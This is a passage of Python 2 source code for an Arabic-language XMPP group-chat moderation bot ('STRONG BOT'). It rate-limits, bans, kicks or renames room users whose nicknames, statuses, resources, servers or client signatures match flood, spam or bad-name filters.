  FAST_filter_speed4[jid]['len']=0    	
  return
 
def filter_pres_start(m, text,type,query,iq,chat,jid,xs,cljid):

 if not jid in FAST_filter_speed2:
  FAST_filter_speed2[jid]={'time':0,'len':0} 
 if FAST_filter_speed2[jid]['len']>=3: 
  ban1(cljid, chat, " زيادة في تخطي الفلاتر ", jid)    
  FAST_filter_speed2[jid]['time']=time.time() 
  FAST_filter_speed2[jid]['len']=0  
 elif time.time()- FAST_filter_speed2[jid]['time']<=10:
  FAST_filter_speed2[jid]['len']+=1  
  return
 else: 
  i = xs_001(m, text)
  query.addRawXml(i.toXml())
  reactor.callFromThread(iq.send, xs['from'],)
  FAST_filter_speed2[jid]['time']=time.time() 
  FAST_filter_speed2[jid]['len']=0    	
  return
  
  
def chat3(m, text):
    body = None
    for x in m.elements():
        if x.name == 'body':
            try: body = x.__str__()
            except: pass
    ms = domish.Element(('jabber:client','message'))
    ms['to'] = m['to']
    ms['from'] = m['from']
    ms['type'] = m['type']
    ms.addElement("body", "jabber:client", text.decode('utf8'))
    return ms
	
def chat2(m, text,type,query,iq,chat,jid,xs,s):
	
 if not jid in FAST_filter_speed1:
  FAST_filter_speed1[jid]={'time':0,'len':0} 
 if FAST_filter_speed1[jid]['len']>=Traffic: 
  kick2(s, natox7x7)     
  FAST_filter_speed1[jid]['time']=time.time() 
  FAST_filter_speed1[jid]['len']=0  
 elif time.time()- FAST_filter_speed1[jid]['time']<=7:
  FAST_filter_speed1[jid]['len']+=1  
  return
 else: 
  i = chat3(m, text)
  query.addRawXml(i.toXml())
  reactor.callFromThread(iq.send, xs['from'],)
  FAST_filter_speed1[jid]['time']=time.time() 
  FAST_filter_speed1[jid]['len']=0    	
  return
  


def Muc_Filter_startx(m,msg,type,query,iq,chat,jid,xs,s):	
 if not jid in FAST_filter_speedx:
  FAST_filter_speedx[jid]={'time':0,'len':0} 
 if FAST_filter_speedx[jid]['len']>=Traffic: 
  kick2(s, "انت ممنوع من ارسال رسائل بسرعة")    
  FAST_filter_speedx[jid]['time']=time.time() 
  FAST_filter_speedx[jid]['len']=0    
 elif time.time()- FAST_filter_speedx[jid]['time']<=3:
  FAST_filter_speedx[jid]['len']+=1  
  return
 else: 

  i = msgx2x(m, msg,type)
  query.addRawXml(i.toXml())
  reactor.callFromThread(iq.send, xs['from'],)
  FAST_filter_speedx[jid]['time']=time.time() 
  FAST_filter_speedx[jid]['len']=0    
  return	
  
FAST_filter_speed = {}

def Muc_Filter_start(m,msg,type,query,iq,chat,jid,xs,s):	
 if not jid in FAST_filter_speed:
  FAST_filter_speed[jid]={'time':0,'len':0} 
 if FAST_filter_speed[jid]['len']>=Traffic: 
  kick2(s, natox7x7)     
  FAST_filter_speed[jid]['time']=time.time() 
  FAST_filter_speed[jid]['len']=0    
 elif time.time()- FAST_filter_speed[jid]['time']<=10:
  FAST_filter_speed[jid]['len']+=1  
  return
 else: 

  i = msgx2x(m, msg,type)
  query.addRawXml(i.toXml())
  reactor.callFromThread(iq.send, xs['from'],)
  FAST_filter_speed[jid]['time']=time.time() 
  FAST_filter_speed[jid]['len']=0    
  return	
  
def Muc_Filter(xs, cljid):

        if xs['type']!='set': return
        for query in xs.elements(): xmlns = query.uri
        if xmlns != MCF_NS: return
        xmlns, type, body, traf, jid, resource, m, nick, user = None, None, None, 0, None, None, None, None, None
        try: traf = sys.getsizeof(xs.toXml())
        except: pass
        iq = IQ(CLIENTS[cljid], 'result')
        iq['to'] = xs['from']
        iq['id'] = xs['id']
        query = iq.addElement('query', MCF_NS)
        if not xs.children or not xs.children[0].children: return
        for x in xs.children[0].children: m=x
        try: type = m['type']
        except: pass		
        chat = xs['from']
        ######  join room #######
        jid = m['from']
        resource = m['from']
        user = m['from']
        nick = m['to'][len(chat)+1:]
        domain = m['from']        
	
        try: status = [i for i in x.children if i.name=='status'][0].children[0]
        except: status = ""
        try: show = [i for i in x.children if i.name=='show'][0].children[0]
        except: show = ""		
        try: nodx = [i for i in x.children if i.name=='c'][0]
        except: nodx  = ""		
        try: node = nodx['node']
        except: node  = ""	
        try: verx = nodx['ver']
        except: verx  = ""	
        #avalon
        try: status2 = [i for i in x.children if i.name=='x'][0]
        except: status2  = ""	        
        try: _item = [i for i in status2.children if i.name=='history'][0]
        except: _item  = ""        
        try: maxchars = _item['maxchars']
        except: maxchars  = "1"
        try: maxstanzas = _item['maxstanzas']
        except: maxstanzas  = "1"			
        #avalon
        try:	
                 if "off" not in FILTER_Bombas:   		
                    if "1.0.7" in verx:
                     ban1(cljid, chat,  "(زومبي)", jid)				
                     filter_pres_start(m, XFiltMSG[1],type,query,iq,chat,jid,xs,cljid)                     
                     return	
                    elif "1.0.5" in verx:
                     ban1(cljid, chat,  "(زومبي)", jid)				
                     filter_pres_start(m, XFiltMSG[1],type,query,iq,chat,jid,xs,cljid)                     
                     return						 
        except: pass
        try:	
         if "off" not in FILTER_Hack_BOT:   		#فلتر هاك بوت
          if int(maxchars) == 0 and int(maxstanzas) ==0:
           ban1(cljid, chat,  " (فلتر بوتات)", jid)                
           return 		   
        except: pass 
		
        if hasattr(jid, 'count'):
                if jid.count('/'): jid = jid.split('/')[0]
	
        if hasattr(resource, 'count'):
                if resource.count('/'): resource = resource.split('/')[1]
	
        if hasattr(user, 'count'):
                if user.count('@'): user = user.split('@')[0]
        if hasattr(domain, 'count'):
                if domain.count('@'): domain = domain.split('@')[1]                
        domainx = domain.split("/")[0]                
        if traf > Traffic1:
                ban1(cljid, chat, XFiltMSG[65], jid)
                return
        if "off" not in FILTER_China:        #فلتر الصيني
                if badchina(nick):
                        filter_pres_start(m, xmsgdarsh[0],type,query,iq,chat,jid,xs,cljid) 
                        return
        if "off" not in FILTER_China:        
                if badchina(status):
                        filter_pres_start(m, xmsgdarsh[1],type,query,iq,chat,jid,xs,cljid) 
                        return
        if "off" not in FILTER_China:        
                if badchina(resource):
                        filter_pres_start(m, xmsgdarsh[2],type,query,iq,chat,jid,xs,cljid) 
                        return  
        if len(user) >Max_Jid:   	#فلتر الايميل الطوير	                       					
         ban1(cljid, chat,  "(ايميل طويل)", jid)
         filter_pres_start(m, "الايميل الخاص بك طويل جدا تم فصلك نهائيا",type,query,iq,chat,jid,xs,cljid)                     
         return 						
        if not "no" in Filter_Os_Staert:						
         if not chat in NAWRS1:
          NAWRS1[chat] = {}
         if not jid in NAWRS1[chat]:	
          NAWRS1[chat][jid] = {'os':0,'ok':0,'band':0,'msg':0} 	
          write_file(NAWRS1_FILE, str(NAWRS1))			 
         if NAWRS1[chat][jid]['ok']<1  and type not in ['chat','groupchat']:		 
            i = xs_001(m, FILTER_BAD_OS[2])
            query.addRawXml(i.toXml())
            reactor.callFromThread(iq.send, xs['from'],)  
            NAWRS1[chat][jid]['ok']+=1  
            write_file(NAWRS1_FILE, str(NAWRS1))			   
            sss(chat,jid,resource,cljid)		   
            return	
	
         if NAWRS1[chat][jid]['os']>=1:
           i = xs_001(m, FILTER_BAD_OS[0]%(NAWRS1[chat][jid]['msg']))
           query.addRawXml(i.toXml())
           reactor.callFromThread(iq.send, xs['from'],)                     		 
           ban1(cljid, chat, NAWRS1[chat][jid]['msg'], jid)
           if 'yes' in MSG_BAD_OS:	
            if "www" not in NAWRS1[chat][jid]['band'].lower() and "http" not in NAWRS1[chat][jid]['band'].lower():		   
             msg(cljid,chat,FILTER_BAD_OS[1]% NAWRS1[chat][jid]['band'])		  
           NAWRS1[chat][jid]['ok']=0 
           NAWRS1[chat][jid]['os']=0   	
           NAWRS1[chat][jid]['band']=0  	
           NAWRS1[chat][jid]['msg']=0  	
           write_file(NAWRS1_FILE, str(NAWRS1))			   
           return	
        if Filter6:                                       		
                if checkjid1(jid, chat):
                 filter_pres_start(m, XFiltMSG[37],type,query,iq,chat,jid,xs,cljid)                     
                 return
                if Nick_nawrs(nick,chat):#اسماء كلي
                        for y in rmoz:
                         if y in nick:
                          nick=nick.replace(y,"")  
                        nick=nick.lower()
                        for x in BADNICK[chat].keys():
                         if x in nick:                                                               
                          filter_pres_start(m, "".join(BADNICK[chat][x]["حجب".decode('utf8')].keys()),type,query,iq,chat,jid,xs,cljid)                     
                          return
                if Nick_nawrsx(nick):#اسماء كلي
                        for y in rmoz:
                         if y in nick:
                          nick=nick.replace(y,"")  
                        nick=nick.lower()
                        for x in GBADNICK:
                         if x in nick:                                                               
                          filter_pres_start(m, "".join(GBADNICK[x]["حجب".decode('utf8')].keys()),type,query,iq,chat,jid,xs,cljid)                     
                          return
                if status_nawrs(status,chat):#اسماء كلي
                        for x in BANST[chat].keys():
                         if x in status:                                                               
                          filter_pres_start(m, "".join(BANST[chat][x]["حجب".decode('utf8')].keys()),type,query,iq,chat,jid,xs,cljid)                     
                          return
                if status_nawrsx(status):#اسماء كلي                                
                        for x in GBANST:
                         if x in status:
                          filter_pres_start(m, "".join(GBANST[x]["حجب".decode('utf8')].keys()),type,query,iq,chat,jid,xs,cljid)                     
                          return
                if checkall(status, chat):
                 filter_pres_start(m, XFiltMSG[35],type,query,iq,chat,jid,xs,cljid)                     
                 return
                if checkall(nick, chat):   
                 filter_pres_start(m, XFiltMSG[23],type,query,iq,chat,jid,xs,cljid)                     
                 return				
                if Gcheckall(status):
                 filter_pres_start(m, XFiltMSG[35],type,query,iq,chat,jid,xs,cljid)                     
                 return
                if Gcheckall(nick):
                 filter_pres_start(m, XFiltMSG[23],type,query,iq,chat,jid,xs,cljid)                     
                 return		
                try:	
                 if "off" not in FILTER_Caps:   		#فلتر الكابس
                    if capslist(node):                         
                                 filter_pres_start(m, "كابسك محجوب \n STRONG BOT [2022]",type,query,iq,chat,jid,xs,cljid)                     
                                 return 								
                except: pass	

                try:	
                 if "off" not in FILTER_Bombas:   		#فلتر برامج البومبس
                    if node not in nobadverx and len(verx) > 17:
                     filter_pres_start(m, XFiltMSG[1],type,query,iq,chat,jid,xs,cljid)                     
                     return						
                except: pass
		
                try:	
                 if "off" not in FILTER_Avalon:   	#فلتر برنامج الافالون	
                    if node not in nobadverx and len(maxchars) > 2:
                     filter_pres_start(m, XFiltMSG[2],type,query,iq,chat,jid,xs,cljid)                     
                     return		
                except: pass 
        try:
                for x in BANRES[chat].keys():   #فلتر حجب الريسورسات
                        if x in resource:
                                if "حجب".decode('utf8') in BANRES[chat][x].keys():
                                 filter_pres_start(m, "ريسورسك محجوب \n STRONG BOT [2022]",type,query,iq,chat,jid,xs,cljid)                     
                                 return 										
        except: pass
        
        try:
                for x in GBANRES:
                        if x in resource:     #فلتر حجب الريسورسات
                                if "حجب".decode('utf8') in GBANRES[x].keys():
                                 filter_pres_start(m, "ريسورسك محجوب\n STRONG BOT [2022]",type,query,iq,chat,jid,xs,cljid)                                 
                                 return 										
        except: pass
        try:        #فلتر حجب السيرفرات
                if domainx in BANDO[chat].keys() and "حجب".decode('utf8') in BANDO[chat][domainx].keys() :
                 filter_pres_start(m, "سيرفرك محجوب\n STRONG BOT [2022]",type,query,iq,chat,jid,xs,cljid)                 
                 return 						
        except: pass
        try:        #فلتر حجب السيرفرات
                if domainx in GBANDO and "حجب".decode('utf8') in GBANDO[domainx].keys() :
                 filter_pres_start(m, "سيرفرك محجوب\n STRONG BOT [2022]",type,query,iq,chat,jid,xs,cljid)                 
                 return 						
        except: pass         
        try:
            for x in BANJID[chat].keys():    ##فلتر حجب الحسابات
                if x in user and "حجب".decode('utf8') in BANJID[chat][x].keys() :
                 filter_pres_start(m, "حسابك محجوب\n STRONG BOT [2022]",type,query,iq,chat,jid,xs,cljid)                     
                 return 						
        except: pass
        try:
            for x in GBANJID:    #فلتر حجب الحسابات
                if x in user and "حجب".decode('utf8') in GBANJID[x].keys() :
                 filter_pres_start(m, "حسابك محجوب\n STRONG BOT [2022]",type,query,iq,chat,jid,xs,cljid)                     
                 return 						
        except: pass  
        if Filter4:                
                if checkres(resource):
                        ban1(cljid, chat, XFiltMSG[3], jid)                        
                        i = xs_001(m, XFiltMSG[5]%(XFiltMSG[4]))
                        query.addRawXml(i.toXml())
                        reactor.callFromThread(iq.send, xs['from'],)
                        return
                if "off" not in FILTER_MINRES:						
                        if len(resource) < MIN_RESZ:    #فلتر الريسورس القصير
                         filter_pres_start(m, "فلتر الريسورس القصير \n STRONG BOT [2022]",type,query,iq,chat,jid,xs,cljid)                     
                         return					
                if "off" not in FILTER_MAXRES:	#فلتر الريسورس الطويل
                        if not chat in MUC_res:
                         MUC_res[chat]={} 								 
                        try: 
                         MAX_RESZ= int("".join(str(MUC_LIN_FILTER["MaxRes"][chat])))						 
                        except: MAX_RESZ=MAX_RES						
                        if len(resource) >= MAX_RESZ and not len(resource) >= MAX_RES_flood:
                                try:
                                        if not 'res' in MUC_res[chat].keys() and "حجب".decode('utf8') in FILTER_MAXRES:
                                         filter_pres_start(m, XFiltMSG[11]%(MAX_RESZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return		
                                        if not 'res' in MUC_res[chat].keys() and "فصل".decode('utf8') in FILTER_MAXRES:
                                         ban1(cljid, chat,  "("+XFiltMSG[9]%(")"), jid)
                                         filter_pres_start(m, XFiltMSG[11]%(MAX_RESZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return                                                
                                        if MUC_res[chat]['res']=='فصل'.decode('utf8'):
                                         ban1(cljid, chat,  "("+XFiltMSG[9]%(")"), jid)
                                         filter_pres_start(m, XFiltMSG[11]%(MAX_RESZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return 												
                                        if MUC_res[chat]['res']=='تعطيل'.decode('utf8'): pass						
                                        if MUC_res[chat]['res']=='حجب'.decode('utf8'):
                                         filter_pres_start(m, XFiltMSG[11]%(MAX_RESZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return	
                                except:  ban1(cljid, chat, XFiltMSG[9]%(XFiltMSG[10]), jid)                                          
                if "off" not in FILTER_MAXRES_Flood:				
                        if len(resource) >= MAX_RES_flood:  		
                         ban1(cljid, chat,  XFiltMSG[12]%("."), jid)
                         filter_pres_start(m, XFiltMSG[12]%(XFiltMSG[4]),type,query,iq,chat,jid,xs,cljid)                     
                         return  		
		
		
        if Filter2:         
				
                if "off" not in FILTER_MINNICK and type not in ['chat','normal','groupchat']:		
                 if len(nick) < MINNICKZ:  #فلتر الاسم القصير
                  filter_pres_start(m, "فلتر الاسم القصير \n STRONG BOT [2022]",type,query,iq,chat,jid,xs,cljid)                     
                  return	                                                                  	
                if not chat in MUC_NICK_NEW:
                         MUC_NICK_NEW[chat]={}					
                nick_new_55=X_Filter_Change_Nick[8]
                if "تفعيل".decode('utf8') in MUC_NICK_NEW[chat].keys() and type == None:                     
                         user2=user.replace("a",nick_new_55["a"]).replace("t",nick_new_55["t"]).replace("b",nick_new_55["b"]).replace("c",nick_new_55["c"]).replace("d",nick_new_55["d"]).replace("e",nick_new_55["e"]).replace("f",nick_new_55["f"]).replace("g",nick_new_55["g"]).replace("h",nick_new_55["h"]).replace("i",nick_new_55["i"]).replace("j",nick_new_55["j"]).replace("k",nick_new_55["k"]).replace("l",nick_new_55["l"]).replace("m",nick_new_55["m"]).replace("n",nick_new_55["n"]).replace("o",nick_new_55["o"]).replace("p",nick_new_55["p"]).replace("q",nick_new_55["q"]).replace("r",nick_new_55["r"]).replace("s",nick_new_55["s"]).replace("u",nick_new_55["u"]).replace("v",nick_new_55["v"]).replace("w",nick_new_55["w"]).replace("x",nick_new_55["x"]).replace("y",nick_new_55["y"]).replace("z",nick_new_55["z"]).encode('utf-8')
                         i = xs_005(m, " | "+nick.replace(nick,"PROTECTION | ")+str(random.randrange(0,999)),'الروم تحت هيمنة بوت سترونج تم تغيير بياناتك بالكامل')
                         query.addRawXml(i.toXml())
                         reactor.callFromThread(iq.send, xs['from'],)
                         
                         
                         return
                if "تعطيل".decode('utf8') not in FILTER_MAXNICK and type not in ['chat','normal','groupchat']:		
                        if not chat in MUC_nick:
                         MUC_nick[chat]={} 		
                        try: 
                         MAXNICKZ= int("".join(str(MUC_LIN_FILTER["MaxNick"][chat])))						 
                        except: MAXNICKZ=MAXNICK  	#فلتر الاسم الطويل
						
                        try: 
                         MAXNICK_FloodZ= int("".join(str(MUC_LIN_FILTER["FloodNick"][chat])))						 
                        except: MAXNICK_FloodZ=MAXNICK_Flood 	#فلتر الاسم الفلود
						
                        if len(nick) >= MAXNICKZ and not len(nick) >= MAXNICK_FloodZ:
                                try:
                                        if not 'nick' in MUC_nick[chat].keys() and "حجب".decode('utf8') in FILTER_MAXNICK:
                                         filter_pres_start(m, XFiltMSG[14]%(MAXNICKZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return	                                                              
                                        if not 'nick' in MUC_nick[chat].keys() and "فصل".decode('utf8') in FILTER_MAXNICK:
                                         ban1(cljid, chat, XFiltMSG[13]%("."), jid)
                                         filter_pres_start(m, XFiltMSG[14]%(MAXNICKZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return  												
                                        if not 'nick' in MUC_nick[chat].keys() and "تغيير".decode('utf8') in FILTER_MAXNICK:                                              
                                         filter_xs_003_start(m, nick.replace(nick,"| LONG NICK"+" | "+str(random.randrange(0,99))),type,query,iq,chat,jid,xs,cljid)                                               
                                         return                                        
                                        if MUC_nick[chat]['nick']=='فصل'.decode('utf8'):
                                         ban1(cljid, chat, XFiltMSG[13]%("."), jid)
                                         filter_pres_start(m, XFiltMSG[14]%(MAXNICKZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return  
                                        if MUC_nick[chat]['nick']=='تعطيل'.decode('utf8'): pass						
                                        if MUC_nick[chat]['nick']=='حجب'.decode('utf8'):
                                         filter_pres_start(m, XFiltMSG[14]%(MAXNICKZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return	
                                        if MUC_nick[chat]['nick']=='تغيير'.decode('utf8'):                                             
                                         filter_xs_003_start(m, nick.replace(nick,"| LONG NICK"+" | "+str(random.randrange(0,99))),type,query,iq,chat,jid,xs,cljid)                                              
                                         return   
                                except:  ban1(cljid, chat, XFiltMSG[13]%("."), jid)                               
                if "off" not in FILTER_MAXNICK_Flood  and type not in ['chat','normal','groupchat']:		
                        if len(nick) >= MAXNICK_FloodZ:
                                ban1(cljid, chat, XFiltMSG[15]%("."), jid)
                                filter_pres_start(m, XFiltMSG[15]%(XFiltMSG[4]),type,query,iq,chat,jid,xs,cljid)                     
                                return                                         
                if "off" not in FILTER_NICK   and type not in ['chat','normal','groupchat']: 
                        if not chat in MUC_nickr:
                         MUC_nickr[chat]={} 					
                        if Nick_Sp2(nick):           #فلتر الاسماء السيئة مسبات و اعلانات
                                try:
                                        if not 'nickr' in MUC_nickr[chat].keys() and "حجب".decode('utf8') in FILTER_NICK:
                                         filter_pres_start(m, XFiltMSG[17],type,query,iq,chat,jid,xs,cljid)                     
                                         return                                                                 
                                        if not 'nickr' in MUC_nickr[chat].keys() and "فصل".decode('utf8') in FILTER_NICK:
                                         ban1(cljid, chat, XFiltMSG[16]%("."), jid)
                                         filter_pres_start(m, XFiltMSG[17],type,query,iq,chat,jid,xs,cljid)                     
                                         return	  
                                        if not 'nickr' in MUC_nickr[chat].keys() and "تغيير".decode('utf8') in FILTER_NICK:                                             
                                         filter_xs_003_start(m, nick.replace(nick,"| BAD NICK"+" | "+str(random.randrange(0,99))),type,query,iq,chat,jid,xs,cljid)                                                
                                         return   												
                                        if MUC_nickr[chat]['nickr']=='فصل'.decode('utf8'):
                                         ban1(cljid, chat, XFiltMSG[16]%("."), jid)
                                         filter_pres_start(m, XFiltMSG[17],type,query,iq,chat,jid,xs,cljid)                     
                                         return 												
                                        if MUC_nickr[chat]['nickr']=='تعطيل'.decode('utf8'):pass					
                                        if MUC_nickr[chat]['nickr']=='حجب'.decode('utf8'):
                                         filter_pres_start(m, XFiltMSG[17],type,query,iq,chat,jid,xs,cljid)                     
                                         return  
                                        if MUC_nickr[chat]['nickr']=='تغيير'.decode('utf8'):
                                         filter_xs_003_start(m, nick.replace(nick,"| BAD NICK"+" | "+str(random.randrange(0,99))),type,query,iq,chat,jid,xs,cljid)                                              
                                         return   
                                except:   ban1(cljid, chat, XFiltMSG[16]%(XFiltMSG[10]), jid)                                          
                if "off" not in FILTER_Nick_AbD :   
                        if not chat in MUC_nickzz:
                         MUC_nickzz[chat]={} 				
                        if Nick_room(nick):#adb        #فلتر الاسماء السيئة مسبات و اعلانات
                                try:
                                        if not 'nickzz' in MUC_nickzz[chat].keys() and "حجب".decode('utf8') in FILTER_Nick_AbD:
                                         filter_pres_start(m, XFiltMSG[18]%("."),type,query,iq,chat,jid,xs,cljid)                     
                                         return          
                                        if not 'nickzz' in MUC_nickzz[chat].keys() and "فصل".decode('utf8') in FILTER_Nick_AbD:
                                         ban1(cljid, chat, XFiltMSG[18]%("."), jid)
                                         filter_pres_start(m, XFiltMSG[18]%("."),type,query,iq,chat,jid,xs,cljid)                     
                                         return  
                                        if not 'nickzz' in MUC_nickzz[chat].keys() and "تغيير" in FILTER_Nick_AbD:
                                         filter_xs_003_start(m, nick.replace(nick,"| BAD NICK"+" | "+str(random.randrange(0,99))),type,query,iq,chat,jid,xs,cljid)                                               
                                         return   												
                                        if MUC_nickzz[chat]['nickzz']=='فصل'.decode('utf8'):
                                         ban1(cljid, chat, XFiltMSG[18]%("."), jid)
                                         filter_pres_start(m, XFiltMSG[18]%("."),type,query,iq,chat,jid,xs,cljid)                     
                                         return 												
                                        if MUC_nickzz[chat]['nickzz']=='تعطيل'.decode('utf8'):
                                                pass						
                                        if MUC_nickzz[chat]['nickzz']=='حجب'.decode('utf8'):
                                         filter_pres_start(m, XFiltMSG[18]%("."),type,query,iq,chat,jid,xs,cljid)                     
                                         return   
                                        if MUC_nickzz[chat]['nickzz']=='تغيير'.decode('utf8'):
                                         filter_xs_003_start(m, nick.replace(nick,"| BAD NICK"+" | "+str(random.randrange(0,99))),type,query,iq,chat,jid,xs,cljid)                                                
                                         return
                                except:   ban1(cljid, chat, XFiltMSG[18]%("."), jid)                                          
                if "off" not in FILTER_Nick_Rep   and type not in ['chat','normal','groupchat']:   
                        if not chat in MUC_nickss:
                         MUC_nickss[chat]={}				
                        if SameChar(nick):#تكرار الاحرف في الاسم
                                try:
                                        if not 'nickss' in MUC_nickss[chat].keys() and "حجب".decode('utf8') in FILTER_Nick_Rep:                                
                                         filter_pres_start(m, XFiltMSG[20],type,query,iq,chat,jid,xs,cljid)                     
                                         return                                                                   
                                        if not 'nickss' in MUC_nickss[chat].keys() and "فصل".decode('utf8') in FILTER_Nick_Rep:
                                         ban1(cljid, chat, XFiltMSG[19], jid)  
                                         filter_pres_start(m, XFiltMSG[20]+"\n"+XFiltMSG[4],type,query,iq,chat,jid,xs,cljid)                     
                                         return 
                                        if not 'nickss' in MUC_nickss[chat].keys() and "تغيير".decode('utf8') in FILTER_Nick_Rep:                                            
                                         filter_xs_003_start(m, nick.replace(nick,"| REPEAT NICK | "+str(random.randrange(0,99))),type,query,iq,chat,jid,xs,cljid)                                               
                                         return	                                                
                                        if MUC_nickss[chat]['nickss']=='فصل'.decode('utf8'):
                                         ban1(cljid, chat, XFiltMSG[19], jid)  
                                         filter_pres_start(m, XFiltMSG[20]+"\n"+XFiltMSG[4],type,query,iq,chat,jid,xs,cljid)                     
                                         return 
                                        if MUC_nickss[chat]['nickss']=='تعطيل'.decode('utf8'):pass						
                                        if MUC_nickss[chat]['nickss']=='تغيير'.decode('utf8'):
                                         filter_pres_start(m, XFiltMSG[20],type,query,iq,chat,jid,xs,cljid)                     
                                         return 
                                        if MUC_nickss[chat]['nickss']=='تغيير'.decode('utf8'):                                           
                                         filter_xs_003_start(m, nick.replace(nick,"| REPEAT NICK | "+str(random.randrange(0,99))),type,query,iq,chat,jid,xs,cljid)                                                
                                         return	
                                except:   ban1(cljid, chat, XFiltMSG[19], jid)                                        
                if "off" not in FILTER_NICK_None   and type not in ['chat','normal','groupchat']:   
                        if not chat in MUC_nickz:
                         MUC_nickz[chat]={}				
                        if nick.isspace():           #فلتر الاسم الفارغ
                                try:
                                        if not 'nickz' in MUC_nickz[chat].keys() and "حجب".decode('utf8') in FILTER_NICK_None:                                                 
                                         filter_pres_start(m, XFiltMSG[22],type,query,iq,chat,jid,xs,cljid)                     
                                         return                                                              
                                        if not 'nickz' in MUC_nickz[chat].keys() and "فصل".decode('utf8') in FILTER_NICK_None:
                                         ban1(cljid, chat, XFiltMSG[21]%("."), jid)    
                                         filter_pres_start(m, XFiltMSG[22],type,query,iq,chat,jid,xs,cljid)                     
                                         return 													
                                        if not 'nickz' in MUC_nickz[chat].keys() and "تغيير".decode('utf8') in FILTER_NICK_None:                                          
                                         filter_xs_003_start(m, nick.replace(nick,"| NONE NICK"+" | "+str(random.randrange(0,99))),type,query,iq,chat,jid,xs,cljid)                                                
                                         return											
                                        if MUC_nickz[chat]['nickz']=='فصل'.decode('utf8'):
                                         ban1(cljid, chat, XFiltMSG[21]%("."), jid)    
                                         filter_pres_start(m, XFiltMSG[22],type,query,iq,chat,jid,xs,cljid)                     
                                         return 
                                        if MUC_nickz[chat]['nickz']=='تعطيل'.decode('utf8'):pass				
                                        if MUC_nickz[chat]['nickz']=='حجب'.decode('utf8'):
                                         filter_pres_start(m, XFiltMSG[22],type,query,iq,chat,jid,xs,cljid)                     
                                         return 
                                        if MUC_nickz[chat]['nickz']=='تغيير'.decode('utf8'):                                            
                                         filter_xs_003_start(m, nick.replace(nick,"| NONE NICK"+" | "+str(random.randrange(0,99))),type,query,iq,chat,jid,xs,cljid)                                                
                                         return
                                except:   ban1(cljid, chat, XFiltMSG[21]%("."), jid)                                                 		
		
		
        if Filter3:                
                if "off" not in FILTER_Status_AbD: 
                        if not chat in MUC_statusz:
                         MUC_statusz[chat]={}                  				 
                        if Status_room(status):     #فلتر الحالات السيئة مسبات و اعلانات
                                try:
                                        if not 'statusz' in MUC_statusz[chat].keys() and "حجب".decode('utf8') in FILTER_Status_AbD:                                                                
                                         filter_pres_start(m, XFiltMSG[34],type,query,iq,chat,jid,xs,cljid)                     
                                         return 														
                                        if not 'statusz' in MUC_statusz[chat].keys() and "فصل".decode('utf8') in FILTER_Status_AbD:
                                         ban1(cljid, chat, XFiltMSG[34], jid)
                                         filter_pres_start(m, XFiltMSG[34]+XFiltMSG[4],type,query,iq,chat,jid,xs,cljid)                     
                                         return 												
                                        if not 'statusz' in MUC_statusz[chat].keys() and "تغيير".decode('utf8') in FILTER_Status_AbD:                                             
                                         filter_xs_002_start(m, status.replace(status,"BAD STATUS"+" | "+"STRONG BOT"),type,query,iq,chat,jid,xs,cljid)
                                         return                                         
                                        if MUC_statusz[chat]['statusz']=='فصل'.decode('utf8'):
                                         ban1(cljid, chat, XFiltMSG[34], jid)
                                         filter_pres_start(m, XFiltMSG[34]+XFiltMSG[4],type,query,iq,chat,jid,xs,cljid)                     
                                         return 	
                                        if MUC_statusz[chat]['statusz']=='تعطيل'.decode('utf8'):pass						
                                        if MUC_statusz[chat]['statusz']=='حجب'.decode('utf8'):
                                         filter_pres_start(m, XFiltMSG[34],type,query,iq,chat,jid,xs,cljid)                     
                                         return 
                                        if MUC_statusz[chat]['statusz']=='تغيير'.decode('utf8'):                                           
                                         filter_xs_002_start(m, status.replace(status,"BAD STATUS"+" | "+"STRONG BOT"),type,query,iq,chat,jid,xs,cljid)
                                         return 														
                                except:    ban1(cljid, chat, XFiltMSG[34], jid)       				
                if "off" not in FILTER_MAX_Status:	
                        if not chat in MUC_status:
                         MUC_status[chat]={} 	
                        try: 
                         MAXSTATUSZ= int("".join(str(MUC_LIN_FILTER["MaxStatus"][chat])))						 
                        except: MAXSTATUSZ=MAXSTATUS  	#فلتر الحالات الطويلة
                        try: 
                         MAXSTATUS_FloodZ= int("".join(str(MUC_LIN_FILTER["FloodStatus"][chat])))						 
                        except: MAXSTATUS_FloodZ=MAXSTATUS_Flood  	
						
                        if len(status) >= MAXSTATUSZ and not len(status) >= MAXSTATUS_FloodZ:
                                try:
                                        if not 'status' in MUC_status[chat].keys() and "حجب".decode('utf8') in FILTER_MAX_Status:
                                         filter_pres_start(m, XFiltMSG[28]%(MAXSTATUSZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return 														
                                        if not 'status' in MUC_status[chat].keys() and "فصل".decode('utf8') in FILTER_MAX_Status:
                                         ban1(cljid, chat, XFiltMSG[27]%("."), jid)
                                         filter_pres_start(m, XFiltMSG[28]%(MAXSTATUSZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return 
                                        if not 'status' in MUC_status[chat].keys() and "تغيير".decode('utf8') in FILTER_MAX_Status:                                              
                                         filter_xs_002_start(m, status[0:MAXSTATUSZ]+XFiltMSG[29],type,query,iq,chat,jid,xs,cljid)
                                         return  										
                                        if MUC_status[chat]['status']=='تغيير'.decode('utf8'):                                              
                                         filter_xs_002_start(m, status[0:MAXSTATUSZ]+XFiltMSG[29],type,query,iq,chat,jid,xs,cljid)
                                         return 
                                        if MUC_status[chat]['status']=='فصل'.decode('utf8'):
                                         ban1(cljid, chat, XFiltMSG[27]%("."), jid)
                                         filter_pres_start(m, XFiltMSG[28]%(MAXSTATUSZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return 												
                                        if MUC_status[chat]['status']=='تعطيل'.decode('utf8'): pass						
                                        if MUC_status[chat]['status']=='حجب'.decode('utf8'):
                                         filter_pres_start(m, XFiltMSG[28]%(MAXSTATUSZ),type,query,iq,chat,jid,xs,cljid)                     
                                         return 
                                except:    ban1(cljid, chat, XFiltMSG[27]%("."), jid)                                     
                if "off" not in FILTER_MAX_Status_Flood:		
                        if len(status) > MAXSTATUS_FloodZ:
                         ban1(cljid, chat, XFiltMSG[30]%("."), jid)
                         filter_pres_start(m, XFiltMSG[30]%(XFiltMSG[4]),type,query,iq,chat,jid,xs,cljid)                     
                         return 								
